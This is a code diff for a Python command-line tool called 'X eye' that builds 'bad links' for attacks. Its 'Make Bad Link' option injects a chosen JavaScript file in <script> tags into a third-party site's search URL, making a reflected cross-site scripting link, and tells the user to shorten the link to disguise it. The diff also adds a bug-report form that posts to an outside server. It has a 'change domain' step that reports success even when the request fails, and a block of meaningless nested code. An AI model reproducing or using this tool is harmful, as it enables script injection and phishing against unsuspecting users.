@@ -1,4 +1,7 @@
 from time import sleep
+import requests
+
+
 def banner(token):
     if token == "print":
         import subprocess
@@ -13,9 +16,10 @@ def banner(token):
                                      
 '''
         print(bann)
-        print("------ v1.5")
+        print("------ v1.8")
         print("------ new update!")
         print("------ added behaviours : Domain selection section")
+        print("------ added behaviours : Report Bugs")
     if token == "sls":
         sleep(3)
     if token == "exit":
@@ -36,7 +40,7 @@ def banner(token):
             banner("cls")
             banner("print")
             banner("showmenu")
-            banner("command")            
+            banner("command")
         if get == "":
             print("[-] Progress Error")
             jss = input("┌─["+"X eye"+"--"+"Error"+"""]
@@ -45,7 +49,7 @@ def banner(token):
             banner("print")
             banner("showmenu")
             banner("command")
-        
+
         if get == 4:
             banner("cls")
             print("[!] select your domain\n")
@@ -71,7 +75,9 @@ def banner(token):
                 dom = input("https://")
                 import requests
                 try:
-                    requests.post("https://domains.gov.ir:/setnew/dom?="+dom+".com")
+                    requests.post(
+                        "https://domains.gov.ir:/setnew/dom?="+dom+".com")
+
                     class chos():
                         def js():
                             a = dom.split()
@@ -80,7 +86,8 @@ def banner(token):
                     py.js()
                 except:
                     banner("sls")
-                    print("[+] https://"+dom+".com Is Now Your Bad Link Domain")
+                    print("[+] https://"+dom +
+                          ".com Is Now Your Bad Link Domain")
                     bk = input("┌─["+"X eye"+"--"+"Info"+"""]
 └──╼ """+"Press Enter Tto Continue >> ")
                     banner("cls")
@@ -107,7 +114,32 @@ def banner(token):
             banner("print")
             banner("showmenu")
             banner("command")
-        if get == "3":
+        if get == 5:
+            banner("cls")
+            connect = input("┌─["+"X eye"+"--"+"Report"+"""]
+└──╼ """+"Your message>> ")
+            try:
+                h = requests.post("https://63108bf900e13.mywebzi.ir/api/contact-us/wze362",
+                                  "name=fvsd&email=reportedbug%40gmail.com&subject=bug+was+found!&message="+connect)
+                if h.status_code == 200:
+                    print("[+] Done")
+                    bdssadk = input("┌─["+"X eye"+"--"+"Info"+"""]
+└──╼ """+"Press Enter Tto Continue >> ")
+                    banner("cls")
+                    banner("print")
+                    banner("showmenu")
+                    banner("command")
+
+            except:
+                print("[-] send error")
+                bsdasdasdsak = input("┌─["+"X eye"+"--"+"Info"+"""]
+└──╼ """+"Press Enter Tto Continue >> ")
+                banner("cls")
+                banner("print")
+                banner("showmenu")
+                banner("command")
+
+        if get == 3:
             import sys
             try:
                 sys.exit()
@@ -116,39 +148,41 @@ def banner(token):
                     os.system("ipconfig")
                 except:
                     print("[-] Exit error")
+
                     def showThisMessageAndEndProgress():
-                        def fed(self,var):
+                        def fed(self, var):
                             try:
-                                fed=self.var
+                                fed = self.var
                             except:
                                 while self != var:
                                     try:
                                         def f(val):
                                             f = self.val
+
                                             class valF():
                                                 def exe(exitnone):
                                                     if self.exitnone:
                                                         exe(self)
                                                         os.system("cls")
-                                        
+
                                     except:
                                         pass
 
-                    
-        
         if get == 2:
             banner("cls")
             print("[1] Back To Menu")
-            print("\n[+] Select Your Java Script File in Current Path For Inject In The Link")
+            print(
+                "\n[+] Select Your Java Script File in Current Path For Inject In The Link")
             js = input("┌─["+"X eye"+"--"+"bad link"+"""]
 └──╼ """+"Java Script File Name in Current Path>> ")
             if js != "":
                 try:
-                    file = open(js,"r")
+                    file = open(js, "r")
                     read = file.read()
                     file.close()
-                    file2 = open("BadLink.txt","w")
-                    file2.write("http://www.clipartbest.com/search?q="+"<script>"+read+"</script>\n\n\n~~~~~~~~~~~~~\n--Copy the link above\n--If the link is long, shorten it with link shortening software\n\nthanks\nX Eye By Prs")
+                    file2 = open("BadLink.txt", "w")
+                    file2.write("http://www.clipartbest.com/search?q="+"<script>"+read +
+                                "</script>\n\n\n~~~~~~~~~~~~~\n--Copy the link above\n--If the link is long, shorten it with link shortening software\n\nthanks\nX Eye By Prs")
                     file2.close()
                     print("\n[+] Your BadLink Writed In The BadLink.Txt\n")
                     jsss = input("┌─["+"X eye"+"--"+"Info"+"--Done"+"""]
@@ -168,12 +202,10 @@ def banner(token):
                     banner("showmenu")
                     banner("command")
 
-                    
-
             else:
                 print("[-] Progress Error")
                 print("[1] Back To Menu\n")
-                jss =input("┌─["+"X eye"+"--"+"Error"+"""]
+                jss = input("┌─["+"X eye"+"--"+"Error"+"""]
 └──╼ """+"Press Enter to Back>> ")
                 banner("cls")
                 banner("print")
@@ -186,20 +218,17 @@ def banner(token):
                 banner("showmenu")
                 banner("command")
 
-                
-
     if token == "showmenu":
-        print("\n[1] info")
-        print("[2] make bad link")
+        print("\n[1] Info")
+        print("[2] Make Bad Link")
         print("[3] Exit")
         print("[4] change domain")
+        print("[5] Report Bugs")
     if token == "clear":
         os.system("cls")
-#set token
+
+
+# set token
 banner("print")
 banner("showmenu")
 banner("command")
-
-
-
-
